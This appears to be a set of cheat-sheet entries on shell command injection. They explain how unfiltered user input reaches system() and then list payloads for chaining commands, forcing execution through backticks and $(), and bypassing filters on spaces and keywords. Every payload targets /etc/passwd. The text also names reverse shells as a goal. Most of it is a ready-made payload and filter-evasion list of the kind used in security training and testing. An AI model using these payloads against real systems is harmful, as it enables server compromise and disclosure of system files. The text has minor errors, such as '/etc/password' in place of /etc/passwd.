

<!--- category: cmdinjection --->
<!--- id: intro --->
<!--- title: Shell commands injection --->
<!--- keywords:  --->
## Shell commands injection

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

For example: a form allows to enter its name and display it.
The server-side code will look like: system ('echo '.$NAME);
If we enter: YOLO; cat /etc/password;
The server will chain the two commands by executing system ('echo YOLO; cat /etc/password;'); and allow us to retrieve the content of the passwd file.


<!--- category: cmdinjection --->
<!--- id: CommandPrinciple --->
<!--- title: Command Injection: Principle --->
<!--- keywords:  --->
## Command Injection: Principle

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

Example: You enter your name in a Web Form, your name is sent to the server then used in a shell command.
The server-side code looks like: 
```
system ('echo '.$NAME);
```
 
Instead of just entering Yolo, you enter: 
```
YOLO; cat /etc/password;
```
 
The server will chain the two commands by executing:
```
system ('echo YOLO; cat /etc/password;'); 
```
 
It is then possible to dump the content of the passwd file.

A command injection gives full control over the server.
One can retrieve informations about the server (uname -a), account names (cat /etc/passwd), web server config files, launch a reverse shell...



<!--- category: cmdinjection --->
<!--- id: CommandChainUx --->
<!--- title: Unix: Chaining shell commands --->
<!--- keywords:  --->
## Unix: Chaining shell commands

Commands separators are : ; && | ||
```
echo YOLO; uname -a; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Only if the first cmd fail
```
 



<!--- category: cmdinjection --->
<!--- id: CommandEvalUx --->
<!--- title: Unix: Force command execution in a string --->
<!--- keywords:  --->
## Unix: Force command execution in a string

To force command execution in a string let use ` $ or {
```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```
 



<!--- category: cmdinjection --->
<!--- id: CommandSpaceFilteres --->
<!--- title: Bypass: Spaces are filtered --->
<!--- keywords:  --->
## Bypass: Spaces are filtered

Developpers sometimes add filters to avoid command injection. For exemple, they could filter Spaces.
Hopefully, even without spaces it's still possible to launch shell commands:
```
cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```
 



<!--- category: cmdinjection --->
<!--- id: CommandBlacklist --->
<!--- title: Bypass: Some keywords are filtered --->
<!--- keywords:  --->
## Bypass: Some keywords are filtered

A keyword based filter is easy to bypass using simple quote, double quote, backslash and slash
```
c'a't /etc/passwd
cat /etc/passwd
c\at /etc/passwd
who``ami
```
 
In case the file '/etc/passwd' is filtered, just add /
```
c\at /etc////////passwd
```
 

